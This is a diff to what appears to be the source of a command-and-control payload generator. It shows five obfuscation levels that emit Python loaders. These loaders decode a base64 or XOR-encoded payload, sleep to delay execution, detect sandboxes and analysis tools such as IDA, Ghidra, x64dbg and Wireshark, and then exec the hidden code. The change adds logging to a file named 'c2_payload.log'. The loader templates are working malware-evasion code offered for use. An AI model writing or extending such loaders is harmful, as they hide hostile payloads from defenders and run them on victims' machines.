@@ -290,9 +290,37 @@ if __name__ == '__main__':
         encoded = base64.b64encode(code.encode()).decode()
         return f"""
 import base64, sys, os, platform, socket, subprocess, json, time, threading
-code = base64.b64decode('{encoded}').decode()
-g = {{'__name__': '__main__', 'sys': sys, 'os': os, 'platform': platform, 'socket': socket, 'subprocess': subprocess, 'base64': base64, 'json': json, 'time': time, 'threading': threading}}
-exec(code, g)
+from pathlib import Path
+
+# Logging setup - MUST BE FIRST
+def _emergency_log(msg):
+    try:
+        log_file = Path(os.getenv('TEMP', '/tmp')) / 'c2_payload.log'
+        with open(log_file, 'a', encoding='utf-8') as f:
+            f.write(msg + '\\n')
+    except:
+        pass
+
+_emergency_log('[STARTUP] Level 1 obfuscation starting')
+_emergency_log('[STARTUP] Python version: ' + str(sys.version))
+_emergency_log('[STARTUP] Platform: ' + sys.platform)
+
+try:
+    code = base64.b64decode('{encoded}').decode()
+    _emergency_log('[STARTUP] Successfully decoded payload')
+except Exception as e:
+    _emergency_log('[ERROR] Failed to decode: ' + str(e))
+    raise
+
+try:
+    g = {{'__name__': '__main__', 'sys': sys, 'os': os, 'platform': platform, 'socket': socket, 'subprocess': subprocess, 'base64': base64, 'json': json, 'time': time, 'threading': threading}}
+    _emergency_log('[STARTUP] Executing payload...')
+    exec(code, g)
+except Exception as e:
+    _emergency_log('[ERROR] Execution failed: ' + str(e))
+    import traceback
+    _emergency_log('[ERROR] Traceback: ' + traceback.format_exc())
+    raise
 """
 
     def obfuscate_level_2(self, code: str) -> str:
@@ -305,12 +333,40 @@ exec(code, g)
 
         return f"""
 import base64, time, sys, os, platform, socket, subprocess, json, threading
-time.sleep({delay})
-key = {key}
-xored = base64.b64decode('{encoded}')
-code = ''.join(chr(b ^ key) for b in xored)
-g = {{'__name__': '__main__', 'sys': sys, 'os': os, 'platform': platform, 'socket': socket, 'subprocess': subprocess, 'base64': base64, 'json': json, 'time': time, 'threading': threading}}
-exec(code, g)
+from pathlib import Path
+
+# Logging setup - MUST BE FIRST
+def _emergency_log(msg):
+    try:
+        log_file = Path(os.getenv('TEMP', '/tmp')) / 'c2_payload.log'
+        with open(log_file, 'a', encoding='utf-8') as f:
+            f.write(msg + '\\n')
+    except:
+        pass
+
+_emergency_log('[STARTUP] Level 2 obfuscation starting')
+_emergency_log('[STARTUP] Python version: ' + str(sys.version))
+
+try:
+    time.sleep({delay})
+    _emergency_log('[STARTUP] Delay complete, decoding payload...')
+    key = {key}
+    xored = base64.b64decode('{encoded}')
+    code = ''.join(chr(b ^ key) for b in xored)
+    _emergency_log('[STARTUP] Successfully decoded payload')
+except Exception as e:
+    _emergency_log('[ERROR] Failed to decode: ' + str(e))
+    raise
+
+try:
+    g = {{'__name__': '__main__', 'sys': sys, 'os': os, 'platform': platform, 'socket': socket, 'subprocess': subprocess, 'base64': base64, 'json': json, 'time': time, 'threading': threading}}
+    _emergency_log('[STARTUP] Executing payload...')
+    exec(code, g)
+except Exception as e:
+    _emergency_log('[ERROR] Execution failed: ' + str(e))
+    import traceback
+    _emergency_log('[ERROR] Traceback: ' + traceback.format_exc())
+    raise
 """
 
     def obfuscate_level_3(self, code: str) -> str:
@@ -323,6 +379,19 @@ exec(code, g)
 
         return f"""
 import base64, time, os, sys, platform, socket, subprocess, json, threading
+from pathlib import Path
+
+# Logging setup - MUST BE FIRST
+def _emergency_log(msg):
+    try:
+        log_file = Path(os.getenv('TEMP', '/tmp')) / 'c2_payload.log'
+        with open(log_file, 'a', encoding='utf-8') as f:
+            f.write(msg + '\\n')
+    except:
+        pass
+
+_emergency_log('[STARTUP] Level 3 obfuscation starting')
+
 def is_sandboxed():
     sandbox_indicators = ["VBoxService", "VBoxTray", "vmtoolsd", "qemu-ga", "sandbox", "virtualbox"]
     try:
@@ -331,14 +400,31 @@ def is_sandboxed():
         return any(ind in result for ind in sandbox_indicators)
     except:
         return False
+
 if is_sandboxed():
+    _emergency_log('[SANDBOX] Detected, exiting')
     sys.exit()
-time.sleep({delay})
-key = {key}
-xored = base64.b64decode('{encoded}')
-code = ''.join(chr(b ^ key) for b in xored)
-g = {{'__name__': '__main__', 'sys': sys, 'os': os, 'platform': platform, 'socket': socket, 'subprocess': subprocess, 'base64': base64, 'json': json, 'time': time, 'threading': threading}}
-exec(code, g)
+
+try:
+    time.sleep({delay})
+    _emergency_log('[STARTUP] Decoding payload...')
+    key = {key}
+    xored = base64.b64decode('{encoded}')
+    code = ''.join(chr(b ^ key) for b in xored)
+    _emergency_log('[STARTUP] Successfully decoded payload')
+except Exception as e:
+    _emergency_log('[ERROR] Failed to decode: ' + str(e))
+    raise
+
+try:
+    g = {{'__name__': '__main__', 'sys': sys, 'os': os, 'platform': platform, 'socket': socket, 'subprocess': subprocess, 'base64': base64, 'json': json, 'time': time, 'threading': threading}}
+    _emergency_log('[STARTUP] Executing payload...')
+    exec(code, g)
+except Exception as e:
+    _emergency_log('[ERROR] Execution failed: ' + str(e))
+    import traceback
+    _emergency_log('[ERROR] Traceback: ' + traceback.format_exc())
+    raise
 """
 
     def obfuscate_level_4(self, code: str) -> str:
@@ -351,17 +437,50 @@ exec(code, g)
 
         return f"""
 import base64, time, sys, os
-socket_module = __import__('socket')
-subprocess_module = __import__('subprocess')
-platform_module = __import__('platform')
-json_module = __import__('json')
-threading_module = __import__('threading')
-time.sleep({delay})
-key = {key}
-xored = base64.b64decode('{encoded}')
-code = ''.join(chr(b ^ key) for b in xored)
-g = {{'__name__': '__main__', 'sys': sys, 'os': os, 'platform': platform_module, 'socket': socket_module, 'subprocess': subprocess_module, 'base64': base64, 'json': json_module, 'time': time, 'threading': threading_module}}
-exec(code, g)
+from pathlib import Path
+
+# Logging setup - MUST BE FIRST
+def _emergency_log(msg):
+    try:
+        log_file = Path(os.getenv('TEMP', '/tmp')) / 'c2_payload.log'
+        with open(log_file, 'a', encoding='utf-8') as f:
+            f.write(msg + '\\n')
+    except:
+        pass
+
+_emergency_log('[STARTUP] Level 4 obfuscation starting (dynamic imports)')
+
+try:
+    socket_module = __import__('socket')
+    subprocess_module = __import__('subprocess')
+    platform_module = __import__('platform')
+    json_module = __import__('json')
+    threading_module = __import__('threading')
+    _emergency_log('[STARTUP] All modules imported successfully')
+except Exception as e:
+    _emergency_log('[ERROR] Failed to import modules: ' + str(e))
+    raise
+
+try:
+    time.sleep({delay})
+    _emergency_log('[STARTUP] Decoding payload...')
+    key = {key}
+    xored = base64.b64decode('{encoded}')
+    code = ''.join(chr(b ^ key) for b in xored)
+    _emergency_log('[STARTUP] Successfully decoded payload')
+except Exception as e:
+    _emergency_log('[ERROR] Failed to decode: ' + str(e))
+    raise
+
+try:
+    g = {{'__name__': '__main__', 'sys': sys, 'os': os, 'platform': platform_module, 'socket': socket_module, 'subprocess': subprocess_module, 'base64': base64, 'json': json_module, 'time': time, 'threading': threading_module}}
+    _emergency_log('[STARTUP] Executing payload...')
+    exec(code, g)
+except Exception as e:
+    _emergency_log('[ERROR] Execution failed: ' + str(e))
+    import traceback
+    _emergency_log('[ERROR] Traceback: ' + traceback.format_exc())
+    raise
 """
 
     def obfuscate_level_5(self, code: str) -> str:
@@ -374,22 +493,52 @@ exec(code, g)
 
         return f"""
 import base64, time, sys, os, platform, socket, subprocess, json, threading
+from pathlib import Path
+
+# Logging setup - MUST BE FIRST
+def _emergency_log(msg):
+    try:
+        log_file = Path(os.getenv('TEMP', '/tmp')) / 'c2_payload.log'
+        with open(log_file, 'a', encoding='utf-8') as f:
+            f.write(msg + '\\n')
+    except:
+        pass
+
+_emergency_log('[STARTUP] Level 5 obfuscation starting (EXTREME)')
+
 def extreme_check():
     try:
         import subprocess
         result = subprocess.check_output("tasklist", shell=True).decode().lower()
         dangerous = ["ida", "ghidra", "ollydbg", "windbg", "x64dbg", "wireshark", "burp", "fiddler"]
         if any(d in result for d in dangerous):
+            _emergency_log('[DEBUGGER] Detected, exiting')
             sys.exit(1)
     except:
         pass
+
 extreme_check()
-time.sleep({delay})
-key = {key}
-xored = base64.b64decode('{encoded}')
-code = ''.join(chr(b ^ key) for b in xored)
-g = {{'__name__': '__main__', 'sys': sys, 'os': os, 'platform': platform, 'socket': socket, 'subprocess': subprocess, 'base64': base64, 'json': json, 'time': time, 'threading': threading}}
-exec(code, g)
+
+try:
+    time.sleep({delay})
+    _emergency_log('[STARTUP] Decoding payload...')
+    key = {key}
+    xored = base64.b64decode('{encoded}')
+    code = ''.join(chr(b ^ key) for b in xored)
+    _emergency_log('[STARTUP] Successfully decoded payload')
+except Exception as e:
+    _emergency_log('[ERROR] Failed to decode: ' + str(e))
+    raise
+
+try:
+    g = {{'__name__': '__main__', 'sys': sys, 'os': os, 'platform': platform, 'socket': socket, 'subprocess': subprocess, 'base64': base64, 'json': json, 'time': time, 'threading': threading}}
+    _emergency_log('[STARTUP] Executing payload...')
+    exec(code, g)
+except Exception as e:
+    _emergency_log('[ERROR] Execution failed: ' + str(e))
+    import traceback
+    _emergency_log('[ERROR] Traceback: ' + traceback.format_exc())
+    raise
 """
 
     def generate(self) -> str:
